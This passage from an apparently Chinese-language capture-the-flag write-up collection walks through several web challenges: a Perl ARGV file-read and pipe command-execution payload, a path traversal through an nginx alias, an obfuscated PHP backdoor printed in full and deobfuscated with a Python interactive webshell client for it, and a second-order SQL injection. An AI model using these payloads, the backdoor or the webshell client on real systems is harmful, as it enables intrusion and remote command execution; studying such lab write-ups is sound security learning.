#注册  
requests.post(inject_page,data_flag)  
login_data={  
'password':'admin',  
"email":"admin32@admin.com"+str(i)  
}  
response=requests.post(show_page,login_data)  
html=response.text #返回的页面  
soup=BeautifulSoup(html,'html.parser')  
getUsername=soup.find_all('span')[0]#获取用户名  
username=getUsername.text  
if int(username)==0:  
break  
flag+=chr(int(username))  
return flag  
  
print(getFlag(inject_page, show_page))

得到falg

flag{2494e4bf06734c39be2e1626f757ba4c}

## 28.i-got-id-200

Perl写的站，里面有三个界面。

直接来到上传，随便先上传一个文件。  
他把上传的文件内容返回出来了，猜测后台源码逻辑

use strict;  
use warnings;  
use CGI;  
my $cgi= CGI->new;  
if ( $cgi->upload( 'file' ) ) {  
my $file= $cgi->param( 'file' );  
while ( <$file> ) { print "$_"; }  
}

param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。

payload是：

?/bin/bash%20-c%20ls${IFS}/|

通过管道的方式，执行任意命令，然后将其输出结果用管道传输到读入流中，这样就可以保证获取到flag文件的位置了。这里用到了${IFS}来作命令分割，原理是会将结果变成bash
-c "ls/"的等价形式。最后得到flag

POST http://220.249.52.133:34272/cgi-bin/file.pl?/flag HTTP/1.1  
Host: 220.249.52.133:34272  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101
Firefox/81.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: multipart/form-data;
boundary=---------------------------121949621324004369911858695883  
Content-Length: 485  
Origin: http://220.249.52.133:34272  
DNT: 1  
Connection: close  
Referer: http://220.249.52.133:34272/cgi-bin/file.pl  
Cookie: user=4b9987ccafacb8d8fc08d22bbca797ba  
Upgrade-Insecure-Requests: 1  
  
\-----------------------------121949621324004369911858695883  
Content-Disposition: form-data; name="file";  
Content-Type: text/plain  
  
ARGV  
\-----------------------------121949621324004369911858695883  
Content-Disposition: form-data; name="file"; filename="test.txt"  
Content-Type: text/plain  
  
test  
\-----------------------------121949621324004369911858695883  
Content-Disposition: form-data; name="Submit!"  
  
Submit!  
\-----------------------------121949621324004369911858695883--
得到falg

cyberpeace{522b190f6404a5d8cc69e32f7263380a}

## 29.Webphpwrongnginxconfig

进入网页是一个登录界面，测试注入失败，进行常规的目录扫描，得到

/admin/?/login  
/admin/admin.php  
/admin/index.php  
/hint.php  
/login.php  
/robots.txt

接下来一个一个查看：

/admin/?/login please continue  
/admin/admin.php You need to log in!  
/admin/index.php please continue  
/hint.php 配置文件也许有问题呀：/etc/nginx/sites-enabled/site.conf  
/login.php  
/robots.txt hint.php Hack.php  
/Hack.php 请登录！

从它的提示界面Hack.php入手，抓包看看，发现参数isLogin=0，修改为1

出现新的界面，抓包观察，发现在点击管理中心时url出现?file=index&ext=php

尝试进行文件读取,发现../被过滤，使用双写进行绕过，然后读取site.conf

payload:file=..././..././..././..././etc/nginx/sites-enabled/site.conf&ext=

得到

server {  
listen 8080;  
## listen for ipv4;  
this line is default and implied listen [::]:8080;  
## listen for ipv6 root /var/www/html;  
index index.php index.html index.htm;  
port_in_redirect off;  
server_name _;  
# Make site accessible from http://localhost/ #server_name localhost;  
# If block for setting the time for the logfile if ($time_iso8601 ~
"^(\d{4})-(\d{2})-(\d{2})") { set $year $1;  
set $month $2;  
set $day $3;  
}  
# Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off;  
set $http_x_forwarded_for_filt $http_x_forwarded_for;  
if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) {  
set $http_x_forwarded_for_filt $1???;  
}  
# Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;  
error_log /var/log/nginx/error.log info;  
location / {  
# First attempt to serve request as file, then # as directory, then fall back
to index.html try_files $uri $uri/ /index.php?q=$uri&$args;  
server_tokens off;  
}  
#error_page 404 /404.html;  
# redirect server error pages to the static page /50x.html # error_page 500
502 503 504 /50x.html;  
location = /50x.html {  
root /usr/share/nginx/html;  
}  
location ~ \\.php$ {  
try_files $uri $uri/ /index.php?q=$uri&$args;  
fastcgi_split_path_info ^(.+\\.php)(/.+)$;  
fastcgi_pass unix:/var/run/php/php5.6-fpm.sock;  
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;  
fastcgi_param SCRIPT_NAME $fastcgi_script_name;  
fastcgi_index index.php;  
include fastcgi_params;  
fastcgi_param REMOTE_ADDR $http_x_forwarded_for;  
}  
location ~ /\\. {  
log_not_found off;  
deny all;  
}  
location /web-img {  
alias /images/;  
autoindex on;  
}  
location ~* \\.(ini|docx|pcapng|doc)$ {  
deny all;  
}  
include /var/www/nginx[.]conf;  
}

location /requestpath/image/ {  
alias /localpath/image/;  
}

这时候，当客户端请求 /requestpath/image/cat.png 的时候，  
Nginx把请求映射为/localpath/image/cat.png

发现通过/web-img可以访问根目录，根据alias替换规则，进行目录遍历。

访问/web-img../var/www/,发现hack.php.bak

得到如下代码:

<?php  
$U='_/|U","/-/|U"),ar|Uray|U("/|U","+"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle';  
$q='s[|U$i]="";$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui';  
$M='l="strtolower|U";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$';  
$z='r=@$r[|U"HTTP_R|UEFERER|U"];$r|U|Ua=@$r["HTTP_A|U|UCCEPT_LAN|UGUAGE|U"];if|U($r|Ur&|U&$ra){$u=parse_|Uurl($r';  
$k='?:;q=0.([\\\|Ud]))?,|U?/",$ra,$m)|U;if($|Uq&&$m){|U|U|U@session_start()|U|U;$s=&$_SESSIO|UN;$ss="|Usubst|Ur";|U|U$s';  
$o='|U$l;|U){for|U($j=0;($j|U<$c&&|U|U$i|U<$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn
$|Uo;}$r=$|U_SERV|UE|UR;$r';  
$N='|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray("/';  
$C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut("|U<$k>$d</$k>"|U);@ses|U|Usion_des|Utroy();}}}}';  
$j='$k|Uh="|U|U42f7";$kf="e9ac";fun|Uction|U
|Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U"";fo|Ur($i=0;$i<';  
$R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion');  
$J='kf|U),|U0,3));$p="|U";for(|U|U$|Uz=1;$z<cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$';  
$x='r)|U;pa|Urse|U_str($u["qu|U|Uery"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul("/([\\\|U|Uw])[|U\\\w-]+|U(';  
$f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);  
$g=create_function('',$f);  
$g();  
?>

好像是混淆之后的php代码，输出$F，得到代码

<?php  
$kh="42f7";  
$kf="e9ac";  
function x($t,$k) {  
$c=strlen($k);  
$l=strlen($t);  
$o="";  
for ($i=0;$i<$l;) {  
for ($j=0;($j<$c&&$i<$l);$j++,$i++) {  
$o.=$t {  
$i  
}  
^$k {  
$j  
}  
;  
}  
}  
return $o;  
}  
$r=$_SERVER;  
$rr=@$r["HTTP_REFERER"];  
$ra=@$r["HTTP_ACCEPT_LANGUAGE"];  
if($rr&&$ra) {  
$u=parse_url($rr);  
parse_str($u["query"],$q);  
$q=array_values($q);  
preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);  
if($q&&$m) {  
@session_start();  
$s=&$_SESSION;  
$ss="substr";  
$sl="strtolower";  
$i=$m[1][0].$m[1][1];  
$h=$sl($ss(md5($i.$kh),0,3));  
$f=$sl($ss(md5($i.$kf),0,3));  
$p="";  
for ($z=1;$z<count($m[1]);$z++)$p.=$q[$m[2][$z]];  
if(strpos($p,$h)===0) {  
$s[$i]="";  
$p=$ss($p,3);  
}  
if(array_key_exists($i,$s)) {  
$s[$i].=$p;  
$e=strpos($s[$i],$f);  
if($e) {  
$k=$kh.$kf;  
ob_start();  
@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));  
$o=ob_get_contents();  
ob_end_clean();  
$d=base64_encode(x(gzcompress($o),$k));  
print("<$k>$d</$k>");  
@session_destroy();  
}  
}  
}  
}

这是一个后门页面,在网上找到了相关的利用教程:  
[一个PHP混淆后门的分析](https://www.cnblogs.com/go2bed/p/5920811.html)  
根据题目修改后的脚本(修改了密钥和url)如下:

# encoding: utf-8  
  
from random import randint,choice  
from hashlib import md5  
import urllib  
import string  
import zlib  
import base64  
import requests  
import re  
  
def choicePart(seq,amount):  
length = len(seq)  
if length == 0 or length < amount:  
print 'Error Input'  
return None  
result = []  
indexes = []  
count = 0  
while count < amount:  
i = randint(0,length-1)  
if not i in indexes:  
indexes.append(i)  
result.append(seq[i])  
count += 1  
if count == amount:  
return result  
  
def randBytesFlow(amount):  
result = ''  
for i in xrange(amount):  
result += chr(randint(0,255))  
return result  
  
def randAlpha(amount):  
result = ''  
for i in xrange(amount):  
result += choice(string.ascii_letters)  
return result  
  
def loopXor(text,key):  
result = ''  
lenKey = len(key)  
lenTxt = len(text)  
iTxt = 0  
while iTxt < lenTxt:  
iKey = 0  
while iTxt<lenTxt and iKey<lenKey:  
result += chr(ord(key[iKey]) ^ ord(text[iTxt]))  
iTxt += 1  
iKey += 1  
return result  
  
  
def debugPrint(msg):  
if debugging:  
print msg  
  
# config  
debugging = False  
keyh = "42f7" # $kh  
keyf = "e9ac" # $kf  
xorKey = keyh + keyf  
url = 'http://220.249.52.133:58459/hack.php'  
defaultLang = 'zh-CN'  
languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']  
proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug  
  
sess = requests.Session()  
  
# generate random Accept-Language only once each session  
langTmp = choicePart(languages,3)  
indexes = sorted(choicePart(range(1,10),3), reverse=True)  
  
acceptLang = [defaultLang]  
for i in xrange(3):  
acceptLang.append(langTmp[i] % (indexes[i],))  
acceptLangStr = ','.join(acceptLang)  
debugPrint(acceptLangStr)  
  
init2Char = acceptLang[0][0] + acceptLang[1][0] # $i  
md5head = (md5(init2Char + keyh).hexdigest())[0:3]  
md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))  
debugPrint('$i is %s' % (init2Char))  
debugPrint('md5 head: %s' % (md5head,))  
debugPrint('md5 tail: %s' % (md5tail,))  
  
# Interactive php shell  
cmd = raw_input('phpshell > ')  
while cmd != '':  
# build junk data in referer  
query = []  
for i in xrange(max(indexes)+1+randint(0,2)):  
key = randAlpha(randint(3,6))  
value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))  
query.append((key, value))  
debugPrint('Before insert payload:')  
debugPrint(query)  
debugPrint(urllib.urlencode(query))  
  
# encode payload  
payload = zlib.compress(cmd)  
payload = loopXor(payload,xorKey)  
payload = base64.urlsafe_b64encode(payload)  
payload = md5head + payload  
  
# cut payload, replace into referer  
cutIndex = randint(2,len(payload)-3)  
payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)  
iPiece = 0  
for i in indexes:  
query[i] = (query[i][0],payloadPieces[iPiece])  
iPiece += 1  
referer = url + '?' + urllib.urlencode(query)  
debugPrint('After insert payload, referer is:')  
debugPrint(query)  
debugPrint(referer)  
  
# send request  
r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies)  
html = r.text  
debugPrint(html)  
  
# process response  
pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))  
output = pattern.findall(html)  
if len(output) == 0:  
print 'Error, no backdoor response'  
cmd = raw_input('phpshell > ')  
continue  
output = output[0]  
debugPrint(output)  
output = output.decode('base64')  
output = loopXor(output,xorKey)  
output = zlib.decompress(output)  
print output  
cmd = raw_input('phpshell > ')

利用python运行，然后执行命令

system("ls") ;  
system("cat fllla4aggg.php");

得到flag

ctf{a57b3698-eeae-48c0-a669-bafe3213568c}

## 30.comment

进入页面，尝试发一个帖子，显示出账户名和密码

zhangwei  
zhangwei***

利用burp爆破一下，爆破出密码是666，登录进去

扫描网站目录，发现了git代码泄露，和

/login.php  
/mysql.php  
/index.php  
/index.php/login/

git代码泄露发现一个write_do.php

<?php  
include "mysql.php";  
session_start();  
if($_SESSION['login'] != 'yes'){  
header("Location: ./login.php");  
die();  
}  
if(isset($_GET['do'])){  
switch ($_GET['do'])  
{  
case 'write':  
$category = addslashes($_POST['category']);  
$title = addslashes($_POST['title']);  
$content = addslashes($_POST['content']);  
$sql = "insert into board  
set category = '$category',  
title = '$title',  
content = '$content'";  
$result = mysql_query($sql);  
header("Location: ./index.php");  
break;  
case 'comment':  
$bo_id = addslashes($_POST['bo_id']);  
$sql = "select category from board where id='$bo_id'";  
$result = mysql_query($sql);  
$num = mysql_num_rows($result);  
if($num>0){  
$category = mysql_fetch_array($result)['category'];  
$content = addslashes($_POST['content']);  
$sql = "insert into comment  
set category = '$category',  
content = '$content',  
bo_id = '$bo_id'";  
$result = mysql_query($sql);  
}  
header("Location: ./comment.php?id=$bo_id");  
break;  
default:  
header("Location: ./index.php");  
}  
}  
else{  
header("Location: ./index.php");  
}  
?>

原题是利用git恢复文件

git log --reflog

git reset --hard af36ba2d86ee43cde7b95db513906975cb8ece03（就是第一个红线所指）

可以看到主要是addslashes

  * 后台对输入的参数通过addslashes()对预定义字符进行转义，加上\
  * 预定义的字符包括单引号，双引号，反斜杠，NULL
  * 放到数据库后会把转义符 \ 去掉（进入数据库后是没有反斜杠的），并存入数据库中

在这个php中

  * write的时候所有参数进行了转义才放到sql语句中
  * 但是在comment中，对于category的值从数据库取出来没有进行转义，直接拼接到sql insert语句中
  * 这就是注入位置了

于是思路清晰了：

  * 通过发帖，在category中放入payload，存入数据库中
  * 这一过程payload因为对单引号等作了转义，不会被触发
  * 在发帖成功后，在留言comment，调用insert语句时因为没有对数据库取出的category进行转义，直接拼接触发payload

